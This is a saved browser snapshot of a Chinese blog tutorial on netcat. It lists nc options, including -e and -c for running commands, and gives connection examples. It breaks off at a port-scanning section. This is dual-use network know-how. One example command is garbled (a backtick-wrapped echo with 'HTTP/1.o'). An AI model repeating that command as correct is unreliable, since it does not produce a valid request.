@@ -1,0 +1,3712 @@
+From: <Saved by Blink>
+Snapshot-Content-Location: https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/netcat-usage/
+Subject: =?utf-8?Q?=E5=80=98=E8=8B=A5=E5=BE=AE=E5=B0=8F=20-=20=E4=BD=BF=E7=94=A8?=
+ =?utf-8?Q?=20nc=20=E8=AF=BB=E5=86=99=20TCP/UDP=20=E8=BF=9E=E6=8E=A5?=
+Date: Fri, 5 Jun 2020 02:40:23 -0000
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----"
+
+
+------MultipartBoundary--cMcMRR2qLVMG9r5frlSI25A3ondTpnTpM8CpkvI0yM----
+Content-Type: text/html
+Content-ID: <frame-5A48B47431F3D6B98B6EA6D11D684CD6@mhtml.blink>
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://www.ifmicro.com/%E8%AE%B0%E5%BD%95/2017/12/12/netcat-usage/
+
+<!DOCTYPE html><html class=3D""><head><meta http-equiv=3D"Content-Type" con=
+tent=3D"text/html; charset=3DUTF-8"><link rel=3D"stylesheet" type=3D"text/c=
+ss" href=3D"cid:css-43ee7e75-3a9a-45d5-a372-d6f604c51cff@mhtml.blink" /><li=
+nk rel=3D"stylesheet" type=3D"text/css" href=3D"cid:css-abfe4200-8acd-4e2a-=
+8ecb-11415219707d@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css"=
+ href=3D"cid:css-f1781fcc-802b-44a3-88dc-68b1e5beec35@mhtml.blink" /><link =
+rel=3D"stylesheet" type=3D"text/css" href=3D"cid:css-27fd9829-12a6-4b2b-9d2=
+0-6a45b1a191ba@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" hr=
+ef=3D"cid:css-3a31fc56-9a43-4d2e-9d8d-ead902d5d3f3@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-6ef79796-27c3-4d99-abae-9=
+a15b8340cc3@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=
+=3D"cid:css-72da7b8c-7294-4f65-b00a-ef0697f9b1ba@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-46a9a72b-5626-4d6b-999f-6=
+589a318ca37@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=
+=3D"cid:css-d85c7ec8-3c07-45d9-8b7e-b2904dd00bac@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-235e321a-7b37-476b-922b-e=
+b72314b385b@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=
+=3D"cid:css-069d3e07-62f7-4602-9839-7577c8013248@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-600b600d-5735-46b4-aa5b-6=
+3e7776197c1@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=
+=3D"cid:css-2574fae1-9aac-402e-93ab-641abae49681@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-65b9cbf2-e281-44c5-9b6d-f=
+5eb1dda20dd@mhtml.blink" /><link rel=3D"stylesheet" type=3D"text/css" href=
+=3D"cid:css-b8b78067-5321-4a07-9ea8-c6a1aa91a0b0@mhtml.blink" /><link rel=
+=3D"stylesheet" type=3D"text/css" href=3D"cid:css-6fa64a1b-615a-49bf-855f-2=
+49752c0b0f1@mhtml.blink" />
+ =20
+  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge,chrome=3D1">
+  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
+1">
+ =20
+  <title>=E5=80=98=E8=8B=A5=E5=BE=AE=E5=B0=8F - =E4=BD=BF=E7=94=A8 nc =E8=
+=AF=BB=E5=86=99 TCP/UDP =E8=BF=9E=E6=8E=A5</title>
+ =20
+ =20
+  <meta name=3D"description" content=3D"`nc`, `netcat` =E7=9A=84=E7=BC=A9=
+=E5=86=99, =E6=98=AF=E7=B1=BB unix =E7=B3=BB=E7=BB=9F=E4=B8=8B=E4=B8=80=E4=
+=B8=AA=E5=8A=9F=E8=83=BD=E5=BC=BA=E5=A4=A7=E7=9A=84=E5=91=BD=E4=BB=A4=E8=A1=
+=8C=E7=BD=91=E7=BB=9C=E5=B7=A5=E5=85=B7, =E7=94=A8=E6=9D=A5=E5=9C=A8=E4=B8=
+=A4=E5=8F=B0=E4=B8=BB=E6=9C=BA=E4=B9=8B=E9=97=B4=E5=BB=BA=E7=AB=8B TCP =E6=
+=88=96=E8=80=85 UDP =E8=BF=9E=E6=8E=A5, =E5=B9=B6=E9=80=9A=E8=BF=87=E6=A0=
+=87=E5=87=86=E8=BE=93=E5=85=A5=E8=BE=93=E5=87=BA=E8=BF=9B=E8=A1=8C=E8=AF=BB=
+=E5=92=8C=E5=86=99">
+ =20
+ =20
+  <meta name=3D"keywords" content=3D"Linux,Net,cmd">
+ =20
+  <meta name=3D"author" content=3D"MwumLi">
+  <link rel=3D"shortcut icon" href=3D"https://www.ifmicro.com/assets/imgs/f=
+avicon.ico" type=3D"image/vnd.microsoft.icon">
+  <link rel=3D"stylesheet" href=3D"https://www.ifmicro.com/assets/css/main.=
+css?2.0.4" type=3D"text/css" media=3D"all">
+ =20
+
+
+
+ =20
+
+ =20
+
+ =20
+
+ =20
+ =20
+  <link rel=3D"stylesheet" href=3D"https://www.ifmicro.com/assets/css/bigfo=
+ot-number.css?2.1.4" type=3D"text/css">
+ =20
+ =20
+
+ =20
+ =20
+  <link rel=3D"stylesheet" href=3D"https://www.ifmicro.com/assets/lib/fancy=
+box/source/jquery.fancybox.css?2.1.5" type=3D"text/css">
+ =20
+ =20
+
+
+
+  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media qu=
+eries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// --=
+>
+  <!--[if lt IE 9]>
+    <script src=3D"https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js=
+"></script>
+    <script src=3D"https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min=
+.js"></script>
+  <![endif]-->
+
+  <!-- Fav and touch icons -->
+  <!-- Update these with your own images
+    <link rel=3D"shortcut icon" href=3D"assets/img/favicon.ico">
+    <link rel=3D"apple-touch-icon" href=3D"images/apple-touch-icon.png">
+    <link rel=3D"apple-touch-icon" sizes=3D"72x72" href=3D"images/apple-tou=
+ch-icon-72x72.png">
+    <link rel=3D"apple-touch-icon" sizes=3D"114x114" href=3D"images/apple-t=
+ouch-icon-114x114.png">
+  -->
+  <!-- atom & rss feed -->
+  <link href=3D"https://www.ifmicro.com/atom.xml" type=3D"application/atom+=
+xml" rel=3D"alternate" title=3D"Sitewide ATOM Feed">
+  <link href=3D"https://www.ifmicro.com/rss.xml" type=3D"application/rss+xm=
+l" rel=3D"alternate" title=3D"Sitewide RSS Feed">
+<link type=3D"text/css" rel=3D"stylesheet" charset=3D"UTF-8" href=3D"https:=
+//translate.googleapis.com/translate_static/css/translateelement.css"></hea=
+d>
+
+  <body>
+    <div class=3D"container">
+      <header class=3D"site-header">
+        <div class=3D"site-wrapper clearfix">
+          <a class=3D"site-title" href=3D"https://www.ifmicro.com/">=E5=80=
+=98=E8=8B=A5=E5=BE=AE=E5=B0=8F</a>
+<button class=3D"site-nav-toggle" style=3D"display: none;">
+  <span></span>
+  <span></span>
+  <span></span>
+</button>
+<nav class=3D"site-nav">
+ =20
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/micro-say/2020/">=
+=E5=BE=AE=E8=AF=AD</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/archive/">=E5=
+=BD=92=E6=A1=A3</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/categories/">=
+=E5=88=86=E7=B1=BB</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/pages/tags/">=E6=A0=
+=87=E7=AD=BE</a>
+
+
+
+<a class=3D"page-link " href=3D"https://www.ifmicro.com/rss.xml">=E8=AE=A2=
+=E9=98=85</a>
+
+
+
+</nav>
+
+
+        </div>
+      </header>
+      <main class=3D"site-main">
+        <div class=3D"site-wrapper clearfix">
+          <div class=3D"page-header">
+    <h1>=E4=BD=BF=E7=94=A8 nc =E8=AF=BB=E5=86=99 TCP/UDP =E8=BF=9E=E6=8E=A5=
+ <small></small></h1>
+    <div class=3D"article-header">
+       =20
+       =20
+        <div>
+           =20
+            <span>=E5=88=86=E7=B1=BB: </span>
+            <a href=3D"https://www.ifmicro.com/pages/categories/?names=3D%E=
+8%AE%B0%E5%BD%95" class=3D"tag">=E8=AE=B0=E5=BD=95</a>
+           =20
+           =20
+                <span>=E6=A0=87=E7=AD=BE: </span>
+           =20
+           =20
+                <a href=3D"https://www.ifmicro.com/pages/tags/?names=3DLinu=
+x#tag-search-list" class=3D"tag">Linux</a>
+           =20
+                <a href=3D"https://www.ifmicro.com/pages/tags/?names=3DNet#=
+tag-search-list" class=3D"tag">Net</a>
+           =20
+                <a href=3D"https://www.ifmicro.com/pages/tags/?names=3Dcmd#=
+tag-search-list" class=3D"tag">cmd</a>
+           =20
+        </div>
+        <div>
+            Last Modify in
+           =20
+            <span>2017-12-12</span>,
+           =20
+            published in <span>2017-12-12</span>
+            by <span> MwumLi</span>
+        </div>
+
+       =20
+       =20
+    </div>
+</div>
+
+<div id=3D"page-content">
+   =20
+
+
+<p><code class=3D"highlighter-rouge">nc</code>, <code class=3D"highlighter-=
+rouge">netcat</code> =E7=9A=84=E7=BC=A9=E5=86=99, =E6=98=AF=E7=B1=BB unix =
+=E7=B3=BB=E7=BB=9F=E4=B8=8B=E4=B8=80=E4=B8=AA=E5=8A=9F=E8=83=BD=E5=BC=BA=E5=
+=A4=A7=E7=9A=84=E5=91=BD=E4=BB=A4=E8=A1=8C=E7=BD=91=E7=BB=9C=E5=B7=A5=E5=85=
+=B7, =E7=94=A8=E6=9D=A5=E5=9C=A8=E4=B8=A4=E5=8F=B0=E4=B8=BB=E6=9C=BA=E4=B9=
+=8B=E9=97=B4=E5=BB=BA=E7=AB=8B TCP =E6=88=96=E8=80=85 UDP =E8=BF=9E=E6=8E=
+=A5, =E5=B9=B6=E9=80=9A=E8=BF=87=E6=A0=87=E5=87=86=E8=BE=93=E5=85=A5=E8=BE=
+=93=E5=87=BA=E8=BF=9B=E8=A1=8C=E8=AF=BB=E5=92=8C=E5=86=99</p>
+
+<p><code class=3D"highlighter-rouge">nc</code> =E5=BC=BA=E5=A4=A7=E4=B9=8B=
+=E5=A4=84=E5=9C=A8=E4=BA=8E=E8=BE=93=E5=87=BA=E6=98=AF=E6=A0=87=E5=87=86=E8=
+=BE=93=E5=87=BA(<code class=3D"highlighter-rouge">stdout</code>), =E8=BE=93=
+=E5=85=A5=E6=9D=A5=E8=87=AA=E6=A0=87=E5=87=86=E8=BE=93=E5=85=A5(<code class=
+=3D"highlighter-rouge">stdin</code>), =E4=BB=A5=E8=87=B3=E4=BA=8E=E5=8F=AF=
+=E4=BB=A5=E5=BE=88=E5=AE=B9=E6=98=93=E9=80=9A=E8=BF=87=E7=AE=A1=E9=81=93=E5=
+=92=8C=E9=87=8D=E5=AE=9A=E5=90=91=E7=9B=B4=E6=8E=A5=E4=BD=BF=E7=94=A8=E6=88=
+=96=E8=A2=AB=E5=85=B6=E4=BB=96=E7=A8=8B=E5=BA=8F=E5=92=8C=E8=84=9A=E6=9C=AC=
+=E8=B0=83=E7=94=A8=E3=80=82=E6=AD=A3=E5=9B=A0=E4=B8=BA=E5=AE=83=E7=9A=84=E8=
+=BF=99=E7=A7=8D=E7=89=B9=E6=80=A7, =E4=BB=A5=E8=87=B3=E4=BA=8E=E4=BD=A0=E8=
+=83=BD=E5=8F=91=E6=8C=A5=E4=BD=A0=E7=9A=84=E6=83=B3=E8=B1=A1=E5=8A=9B=E7=94=
+=A8=E5=AE=83=E5=81=9A=E5=BE=88=E5=A4=9A=E4=BA=8B=E6=83=85:</p>
+
+<ul>
+  <li>=E7=AB=AF=E5=8F=A3=E6=89=AB=E6=8F=8F: =E9=80=9A=E8=BF=87=E4=B8=8E=E7=
+=9B=AE=E7=9A=84 IP =E5=BB=BA=E7=AB=8B=E8=BF=9E=E6=8E=A5, =E4=BB=8E=E8=80=8C=
+=E6=89=AB=E6=8F=8F=E7=9B=AE=E7=9A=84IP =E7=9A=84=E7=AB=AF=E5=8F=A3=E6=98=AF=
+=E5=90=A6=E5=BC=80=E6=94=BE</li>
+  <li>=E8=81=8A=E5=A4=A9=E5=B7=A5=E5=85=B7: =E4=B8=80=E8=BE=B9=E4=BD=BF=E7=
+=94=A8 <code class=3D"highlighter-rouge">nc</code> =E7=9B=91=E5=90=AC=E4=B8=
+=80=E4=B8=AA=E7=AB=AF=E5=8F=A3, =E5=8F=A6=E4=B8=80=E8=BE=B9=E4=BD=BF=E7=94=
+=A8 <code class=3D"highlighter-rouge">nc</code> =E6=88=90=E5=8A=9F=E8=BF=9E=
+=E6=8E=A5=E8=BF=99=E4=B8=AA=E7=AB=AF=E5=8F=A3=E5=8D=B3=E5=8F=AF=E4=BA=92=E7=
+=9B=B8=E9=80=9A=E4=BF=A1</li>
+  <li>=E5=8F=91=E9=80=81=E6=96=87=E4=BB=B6: =E4=B8=8E=E7=9B=AE=E7=9A=84 IP =
+=E5=BB=BA=E7=AB=8B=E8=BF=9E=E6=8E=A5, =E9=85=8D=E5=90=88=E9=87=8D=E5=AE=9A=
+=E5=90=91, =E6=BA=90=E5=9C=B0=E5=9D=80=E8=AF=BB=E5=8F=96=E6=96=87=E4=BB=B6,=
+ =E7=9B=AE=E7=9A=84=E5=9C=B0=E5=9D=80=E6=8E=A5=E6=94=B6=E6=96=87=E4=BB=B6</=
+li>
+  <li>=E7=9B=AE=E5=BD=95=E4=BC=A0=E8=BE=93: tar =E5=91=BD=E4=BB=A4=E5=92=8C=
+=E7=AE=A1=E9=81=93=E7=9A=84=E7=BB=93=E5=90=88</li>
+  <li>=E8=BF=9C=E7=A8=8B=E5=85=8B=E9=9A=86=E7=A3=81=E7=9B=98: dd =E5=91=BD=
+=E4=BB=A4=E5=92=8C=E7=AE=A1=E9=81=93=E7=9A=84=E7=BB=93=E5=90=88</li>
+  <li>=E9=85=8D=E5=90=88 ssh config =E7=9A=84 ProxyCommand =E5=91=BD=E4=BB=
+=A4=E8=BF=9B=E8=A1=8C=E8=B7=B3=E6=9D=BF=E7=99=BB=E5=BD=95  <br>
+=E2=80=A6</li>
+</ul>
+
+<p><code class=3D"highlighter-rouge">nc</code> =E6=9C=89=E5=BE=88=E5=A4=9A=
+=E5=8F=98=E7=A7=8D, <code class=3D"highlighter-rouge">ncat</code>,<code cla=
+ss=3D"highlighter-rouge">pnetcat</code>,<code class=3D"highlighter-rouge">s=
+ocat</code>,<code class=3D"highlighter-rouge">sock</code>,<code class=3D"hi=
+ghlighter-rouge">socket</code>,<code class=3D"highlighter-rouge">sbd</code>=
+ =E9=83=BD=E6=98=AF=E6=8C=87=E5=AE=83, =E5=9C=A8=E4=B8=8D=E5=90=8C=E7=9A=84=
+=E7=B3=BB=E7=BB=9F=E4=B8=8B, =E9=83=BD=E8=BF=9B=E8=A1=8C=E4=BA=86=E4=B8=8D=
+=E5=90=8C=E7=A8=8B=E5=BA=A6=E7=9A=84=E4=BF=AE=E6=94=B9, =E4=BD=86=E6=98=AF=
+=E6=97=A0=E8=AE=BA=E6=80=8E=E6=A0=B7, =E9=83=BD=E5=8F=AF=E4=BB=A5=E4=BD=BF=
+=E7=94=A8 <code class=3D"highlighter-rouge">nc</code> =E8=BF=99=E4=B8=AA=E5=
+=90=8D=E5=AD=97</p>
+
+<h2 id=3D"=E9=80=89=E9=A1=B9">=E9=80=89=E9=A1=B9</h2>
+
+<p>=E4=B8=8B=E9=9D=A2=E5=88=97=E4=B8=BE=E7=9A=84=E9=80=89=E9=A1=B9=E5=B9=B6=
+=E4=B8=8D=E4=B8=80=E5=AE=9A=E9=83=BD=E8=83=BD=E4=BD=BF=E7=94=A8, =E5=85=B7=
+=E4=BD=93=E6=A0=B9=E6=8D=AE=E5=BD=93=E5=89=8D=E6=93=8D=E4=BD=9C=E7=B3=BB=E7=
+=BB=9F=E5=AE=89=E8=A3=85=E7=9A=84 <code class=3D"highlighter-rouge">nc</cod=
+e> =E7=89=88=E6=9C=AC=E6=9C=89=E5=85=B3</p>
+
+<ul>
+  <li>
+    <p><code class=3D"highlighter-rouge">-s source_ip_address</code>:  =E6=
+=8C=87=E5=AE=9A <code class=3D"highlighter-rouge">nc</code> =E5=BA=94=E7=94=
+=A8=E4=B8=8E=E8=BF=9C=E7=A8=8B=E4=B8=BB=E6=9C=BA=E5=BB=BA=E7=AB=8B=E8=BF=9E=
+=E6=8E=A5=E7=9A=84 IP  <br>
+  =E5=A6=82=E6=9E=9C=E4=B8=8D=E4=BD=BF=E7=94=A8=E6=AD=A4=E9=80=89=E9=A1=B9,=
+ =E9=BB=98=E8=AE=A4=E4=B8=BA=E4=BD=BF=E7=94=A8 <code class=3D"highlighter-r=
+ouge">0.0.0.0</code></p>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-p source_port</code>: =E6=8C=87=
+=E5=AE=9A <code class=3D"highlighter-rouge">nc</code> =E5=BA=94=E7=94=A8=E4=
+=B8=8E=E8=BF=9C=E7=A8=8B=E4=B8=BB=E6=9C=BA=E5=BB=BA=E7=AB=8B=E8=BF=9E=E6=8E=
+=A5=E7=9A=84=E6=BA=90=E7=AB=AF=E5=8F=A3  <br>
+=E5=A6=82=E6=9E=9C=E4=B8=8D=E6=8C=87=E5=AE=9A=E6=AD=A4=E9=80=89=E9=A1=B9, =
+=E5=88=99=E9=9A=8F=E6=9C=BA=E4=B8=80=E4=B8=AA=E5=8F=AF=E7=94=A8=E7=9A=84=E7=
+=AB=AF=E5=8F=A3</p>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-z</code>: nc =E4=BB=85=E4=BB=85=
+=E6=89=AB=E6=8F=8F=E6=8C=87=E5=AE=9A=E4=B8=BB=E6=9C=BA=E7=9A=84=E7=AB=AF=E5=
+=8F=A3, =E8=80=8C=E4=B8=8D=E5=8F=91=E9=80=81=E4=BB=BB=E4=BD=95=E6=95=B0=E6=
+=8D=AE</p>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-w timeout</code>: =E6=8C=87=E5=AE=
+=9A=E4=B8=8E=E8=BF=9C=E7=A8=8B=E4=B8=BB=E6=9C=BA=E5=BB=BA=E7=AB=8B=E8=BF=9E=
+=E6=8E=A5=E6=88=90=E5=8A=9F=E5=90=8E=E8=B6=85=E8=BF=87 timeout =E7=A7=92=E8=
+=87=AA=E5=8A=A8=E6=96=AD=E5=BC=80=E8=BF=9E=E6=8E=A5  <br>
+=E5=A6=82=E6=9E=9C=E4=B8=8D=E4=BD=BF=E7=94=A8=E6=AD=A4=E9=80=89=E9=A1=B9, =
+=E5=88=99=E9=BB=98=E8=AE=A4=E6=97=A0=E8=B6=85=E6=97=B6</p>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-l [ip]:port</code> : =E7=9B=91=E5=
+=90=AC=E7=AB=AF=E5=8F=A3 port, =E7=9B=B8=E5=BD=93=E4=BA=8E=E6=9C=AC=E6=9C=
+=BA=E5=90=AF=E5=8A=A8=E4=BA=86=E4=B8=80=E4=B8=AA=E6=9C=8D=E5=8A=A1  <br>
+<code class=3D"highlighter-rouge">ip</code> =E6=98=AF=E5=8F=AF=E9=80=89=E7=
+=9A=84, =E5=A6=82=E6=9E=9C=E4=B8=8D=E6=8C=87=E5=AE=9A, =E9=BB=98=E8=AE=A4=
+=E4=B8=BA <code class=3D"highlighter-rouge">0.0.0.0</code></p>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-x proxy_address[:port]</code>: =
+=E6=8C=87=E5=AE=9A nc =E8=AF=B7=E6=B1=82=E6=97=B6=E4=BD=BF=E7=94=A8=E7=9A=
+=84=E4=BB=A3=E7=90=86=E6=9C=8D=E5=8A=A1  <br>
+<code class=3D"highlighter-rouge">port</code> =E6=98=AF=E5=8F=AF=E9=80=89=
+=E7=9A=84, =E5=A6=82=E6=9E=9C=E4=B8=8D=E6=8C=87=E5=AE=9A port, =E5=88=99=E4=
+=BB=A3=E7=90=86=E6=9C=8D=E5=8A=A1=E7=9A=84 port =E4=B8=BA=E6=8C=87=E5=AE=9A=
+=E4=BB=A3=E7=90=86=E5=8D=8F=E8=AE=AE=E7=9A=84=E4=BC=97=E6=89=80=E5=91=A8=E7=
+=9F=A5=E7=9A=84=E7=AB=AF=E5=8F=A3: <code class=3D"highlighter-rouge">1080</=
+code>(SOCKS), <code class=3D"highlighter-rouge">3128</code>(HTTPS)</p>
+  </li>
+  <li><code class=3D"highlighter-rouge">-X proxy_version</code> - =E6=8C=87=
+=E5=AE=9A nc =E8=AF=B7=E6=B1=82=E6=97=B6=E4=BD=BF=E7=94=A8=E4=BB=A3=E7=90=
+=86=E6=9C=8D=E5=8A=A1=E7=9A=84=E5=8D=8F=E8=AE=AE
+    <ul>
+      <li><code class=3D"highlighter-rouge">proxy_version</code> =E4=B8=BA =
+<code class=3D"highlighter-rouge">4</code> : =E8=A1=A8=E7=A4=BA=E4=BD=BF=E7=
+=94=A8=E7=9A=84=E4=BB=A3=E7=90=86=E4=B8=BA SOCKS4 =E4=BB=A3=E7=90=86</li>
+      <li><code class=3D"highlighter-rouge">proxy_version</code> =E4=B8=BA =
+<code class=3D"highlighter-rouge">5</code> : =E8=A1=A8=E7=A4=BA=E4=BD=BF=E7=
+=94=A8=E7=9A=84=E4=BB=A3=E7=90=86=E4=B8=BA SOCKS5 =E4=BB=A3=E7=90=86</li>
+      <li><code class=3D"highlighter-rouge">proxy_version</code> =E4=B8=BA =
+<code class=3D"highlighter-rouge">connect</code> : =E8=A1=A8=E7=A4=BA=E4=BD=
+=BF=E7=94=A8=E7=9A=84=E4=BB=A3=E7=90=86=E4=B8=BA HTTPS =E4=BB=A3=E7=90=86</=
+li>
+      <li>=E5=A6=82=E6=9E=9C=E4=B8=8D=E6=8C=87=E5=AE=9A=E5=8D=8F=E8=AE=AE, =
+=E5=88=99=E9=BB=98=E8=AE=A4=E4=BD=BF=E7=94=A8=E7=9A=84=E4=BB=A3=E7=90=86=E4=
+=B8=BA SOCKS5 =E4=BB=A3=E7=90=86</li>
+    </ul>
+  </li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-u</code>: =E6=8C=87=E5=AE=9A=E4=
+=BD=BF=E7=94=A8=E7=9A=84 UDP =E5=8D=8F=E8=AE=AE  <br>
+      =E5=A6=82=E6=9E=9C=E4=B8=8D=E4=BD=BF=E7=94=A8=E6=AD=A4=E9=80=89=E9=A1=
+=B9, =E9=BB=98=E8=AE=A4=E4=B8=BA=E4=BD=BF=E7=94=A8 TCP =E5=8D=8F=E8=AE=AE</=
+p>
+  </li>
+  <li><code class=3D"highlighter-rouge">-e command</code> : =E6=89=A7=E8=A1=
+=8C=E7=BB=99=E5=87=BA=E7=9A=84=E5=91=BD=E4=BB=A4, <code class=3D"highlighte=
+r-rouge">--exec</code></li>
+  <li>
+    <p><code class=3D"highlighter-rouge">-c command</code> : =E9=80=9A=E8=
+=BF=87 /bin/sh =E6=89=A7=E8=A1=8C=E5=91=BD=E4=BB=A4 command, <code class=3D=
+"highlighter-rouge">--sh-exec</code></p>
+  </li>
+  <li><code class=3D"highlighter-rouge">-v</code> : =E6=89=93=E5=8D=B0=E8=
+=AF=A6=E7=BB=86=E7=9A=84=E8=BE=93=E5=87=BA</li>
+</ul>
+
+<h2 id=3D"=E4=BD=BF=E7=94=A8">=E4=BD=BF=E7=94=A8</h2>
+
+<h3 id=3D"=E5=BB=BA=E7=AB=8B=E5=8E=9F=E5=A7=8B-tcp-=E8=BF=9E=E6=8E=A5">=E5=
+=BB=BA=E7=AB=8B=E5=8E=9F=E5=A7=8B TCP =E8=BF=9E=E6=8E=A5</h3>
+
+<p>=E4=B8=8E <code class=3D"highlighter-rouge">www.baidu.com</code> =E7=9A=
+=84 80 =E7=AB=AF=E5=8F=A3=E5=BB=BA=E7=AB=8B=E4=B8=80=E4=B8=AA TCP =E8=BF=9E=
+=E6=8E=A5(=E6=9C=AC=E5=9C=B0=E7=AB=AF=E5=8F=A3=E9=9A=8F=E6=9C=BA):</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>$ nc www.baidu.com 80
+</code></pre>
+</div>
+
+<p>=E4=BD=BF=E7=94=A8=E6=9C=AC=E5=9C=B0 <code class=3D"highlighter-rouge">1=
+234</code> =E7=AB=AF=E5=8F=A3=E4=B8=8E <code class=3D"highlighter-rouge">ww=
+w.baidu.com</code> =E7=9A=84 80 =E7=AB=AF=E5=8F=A3=E5=BB=BA=E7=AB=8B=E4=B8=
+=80=E4=B8=AA TCP =E8=BF=9E=E6=8E=A5:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>$ nc -p 1234 www.baidu.com 8=
+0
+</code></pre>
+</div>
+
+<p>=E4=B8=8E <code class=3D"highlighter-rouge">www.baidu.com</code> =E7=9A=
+=84 80 =E7=AB=AF=E5=8F=A3=E5=BB=BA=E7=AB=8B=E4=B8=80=E4=B8=AA TCP =E8=BF=9E=
+=E6=8E=A5, =E8=B6=85=E8=BF=87 5s =E8=87=AA=E5=8A=A8=E6=96=AD=E5=BC=80:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>$ nc -w 5 www.baidu.com 80
+</code></pre>
+</div>
+
+<p>=E4=B8=8E <code class=3D"highlighter-rouge">www.baidu.com</code> =E7=9A=
+=84 80 =E7=AB=AF=E5=8F=A3=E5=BB=BA=E7=AB=8B=E4=B8=80=E4=B8=AA TCP =E8=BF=9E=
+=E6=8E=A5, =E5=B9=B6=E5=8F=91=E9=80=81=E8=AF=B7=E6=B1=82=E5=A4=B4, =E6=A8=
+=A1=E6=8B=9F=E6=B5=8F=E8=A7=88=E5=99=A8=E8=AE=BF=E9=97=AE=E7=99=BE=E5=BA=A6=
+:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>	$ echo `GET / HTTP/1.o\r\n\=
+r\n` | nc -p 21337 www.baidu.com 80
+	HTTP/1.1 200 OK
+	Date: Sun, 10 Dec 2017 08:28:45 GMT
+	Content-Type: text/html
+	Content-Length: 14613
+	...
+</code></pre>
+</div>
+
+<p>=E4=B8=8A=E9=9D=A2=E7=94=A8=E6=B3=95=E7=9B=B8=E5=BD=93=E4=BA=8E:</p>
+
+<div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D"dis=
+play: none;"><a class=3D"copy"></a></div><code>	$ nc -p 31337 www.baidu.com=
+ 80
+ 		GET / HTTP/1.0
+	(=E5=9B=9E=E8=BD=A6)
+	(=E5=9B=9E=E8=BD=A6)
+	HTTP/1.1 200 OK
+	Date: Sun, 10 Dec 2017 08:28:45 GMT
+	Content-Type: text/html
+	Content-Length: 14613
+=09
+
+	nc -p 31337 -w 5 host.example.com 42
+</code></pre>
+</div>
+
+<ul>
+  <li>
+    <p>=E4=B8=8E <code class=3D"highlighter-rouge">host.example.com</code> =
+=E7=9A=84 53 =E7=AB=AF=E5=8F=A3=E5=BB=BA=E7=AB=8B=E4=B8=80=E4=B8=AA UDP =E8=
+=BF=9E=E6=8E=A5:</p>
+
+    <div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D=
+"display: none;"><a class=3D"copy"></a></div><code>  nc -u host.example.com=
+ 53
+</code></pre>
+    </div>
+  </li>
+  <li>
+    <p>=E4=BD=BF=E7=94=A8 <code class=3D"highlighter-rouge">10.1.2.3</code>=
+ =E4=BD=9C=E4=B8=BA=E6=9C=AC=E5=9C=B0 IP =E4=B8=8E <code class=3D"highlight=
+er-rouge">host.example.com</code> =E7=9A=84 42 =E7=AB=AF=E5=8F=A3=E5=BB=BA=
+=E7=AB=8B=E4=B8=80=E4=B8=AA TCP =E8=BF=9E=E6=8E=A5:</p>
+
+    <div class=3D"highlighter-rouge"><pre class=3D"highlight"><div style=3D=
+"display: none;"><a class=3D"copy"></a></div><code>  nc -s 10.1.2.3 host.ex=
+ample.com 42
+</code></pre>
+    </div>
+  </li>
+</ul>
+
+<h3 id=3D"=E7=AB=AF=E5=8F=A3=E6=89=AB=E6=8F=8F">=E7=AB=AF=E5=8F=A3=E6=89=AB=
+=E6=8F=8F</h3>
+
+<p>=E7=AB=AF=E5=8F=A3=E6=89=AB=E6=8F=8F=E7=BB=8F=E5=B8=B8=E8=A2=AB=E7=B3=BB=
+=E7=BB=9F=E7=AE=A1=E7=90=86=E5=91=98=E5=92=8C=E9=BB=91=E5=AE=A2=E7=94=A8=E6=
+=9D=A5=E5=8F=91=E7=8E=B0=E5=9C=A8=E4=B8=80=E4=BA=9B=E6=9C=BA=E5=99=A8=E4=B8=
+=8A=E5=BC=80=E6=94=BE=E7=9A=84=E7=AB=AF=E5=8F=A3=EF=BC=8C=E5=B8=AE=E5=8A=A9=
+=E4=BB=96=E4=BB=AC=E8=AF=86=E5=88=AB=E7=B3=BB=E7=BB=9F=E4=B8=AD=E7=9A=84=E6=
+=BC=8F=E6=B4=9E</p>
+
+<ul>
+  <li>
